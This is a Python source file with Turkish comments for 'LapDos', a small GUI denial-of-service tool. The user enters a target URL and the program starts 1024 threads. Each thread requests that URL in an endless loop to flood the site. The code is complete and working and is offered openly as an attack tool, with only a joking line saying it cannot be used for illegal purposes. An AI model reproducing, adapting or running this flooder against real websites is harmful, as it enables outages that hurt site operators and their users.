##
##  LapDos - Dos Programı
##
##  Copyright (C) 2017 - Şerif İnanır  - Alanya Alaaddin Keykubat Üniversitesi
##  E- Mail: sheriffnnr[at]gmail.com
##
##  LapDos is free software: you can redistribute it and/or modify it
## under the terms of the GNU General Public License as published by the
## Free Software Foundation, either version 3 of the License, or
## (at your option) any later version.
##
## LapDos is distributed in the hope that it will be useful, but
## WITHOUT ANY WARRANTY; without even the implied warranty of
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
## See the GNU General Public License for more details.
##
## You should have received a copy of the GNU General Public License along
## with this program.  If not, see <http://www.gnu.org/licenses/>.
#####################################################################################


#  PROGRAM AMACI ve GENEL YAPISI
#
#  Program web sitelerine sürekli yeni bağlantı isteği
#  gönderir. Bu istekler 3. parti modül olan 'requests'
#  ile yapılmıştır. İstenilirse standart modüllerden  olan
#  'urllib' yada 'socket' ile bağlantı isteği gönderilebilir.
#
#  Programın daha işlevli olabilmesi için;
#  yeni bağlantı isteğini bir önceki istek bittikten sonra
#  gerçekleştirmek yerine, alt istekler (SubProcess yada MultiProcess)
#  oluşturup bir anda gerçekleştirdim. Bu işlevselliği
#  Standart modül olan 'threading' ile yaptım.
#
#  Kullanıcı arayüzü için standart modül olan 'Tkinter'i kullandım.
#
#  İllegal amaçlar için kullanılamaz :))

# PROGRAM BAŞLANGICI

from tkinter import*
import requests,threading
class DOS(Tk):
    def __init__(self,_title):

        ## GENEL TKİNTER FONKSİYONLARI
        Tk.__init__(self)
        self.widgets()
        self.title(_title)
        self.resizable(False,False)
        self.geometry("+200+80")
        self.attack_size=1024
        self.attack_info=0
        self.onoff=1
    def widgets(self):

        # PROGRAMIN ARKA PLAN RENGİ VE İSİM KISMI
        backcolor=Label(width=700,height=700,bg=_bg)
        backcolor.place(x=-5,y=-5)
        head=Label(text="   LapRooz Dosser v0.1   ",
                   font=("URW Chancery L",32,"bold"),
                   bg=_bg,fg=_fg)
        head.pack()

        # URL GİRDİ KISMI
        target=Label(text="\nHedef: ",
                     font=("Ubuntu",12,"bold"),
                     bg=_bg,fg=_fg)
        target.pack()
        self._url=Entry(width=30,fg=_bg)
        self._url.pack()
        self.fire=Button(text="Saldır",
                    font=("URW Bookman L",12,"bold"),
                    bg=_bg,bd=-1,
                    fg="#047a18",
                    activebackground="#800000",
                    command=self.kontrol)
        self.fire.pack()
        ara1=Label(text="",bg=_bg)
        ara1.pack()

        # PROGRAM ATAK BİLGİLERİ
        self.info=Listbox(height=15,width=50)
        self.info.pack()
        self.info.insert(0,"~~~~~~~~HEDEF BİLGİSİ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
        ara2 = Label(text="\nŞerif İnanır~ Alanya Allaaddin Keykubat University",
                     bg=_bg,fg=_fg,
                     font=("Ubuntu",10))
        ara2.pack()

    # SALDIR BUTONU DEĞİŞİKLİĞİ
    def kontrol(self):
        if self.onoff==0:
            self.onoff+=1
            self.fire["text"]="Saldır"
        else:
            self.onoff-=1
            self.fire["text"]="Dur"
            ctrl = threading.Thread(target=self.kontrol2())
            ctrl.start()

    # KULLANICI HATALARI
    def kontrol2(self):
        url=self._url.get()
        if not url:
            self.info.insert(0,"URL Girmedin")
        else:
            try:
                test=requests.get(url)
                while self.attack_size>0:

                    ## ALT İŞLEM OLUŞTURMA
                    buf=threading.Thread(target=self.attack,args=(url,))
                    buf.start()
                    self.attack_size-=1
            except:
                self.info.insert(0,"URL Yanlış yada Bağlantın Yok")

    # SİTEYE BAĞLANTI FONKSİYONU
    def attack(self,url):
        while True:
            try:
                if self.onoff==1:
                    break
                yummy=requests.get(url)
                self.attack_info+=1
                info_msg=self.attack_info," Başarılı"
                self.info.insert(0,info_msg)
            except:
                info_msg="Bağlantı Yok"
                self.info.insert(0,info_msg)
_bg="#363636"
_fg="#bebebe"
if __name__=="__main__":
    try:
        root=DOS("LapRooz~ Dosser").mainloop()
    except:
        pass
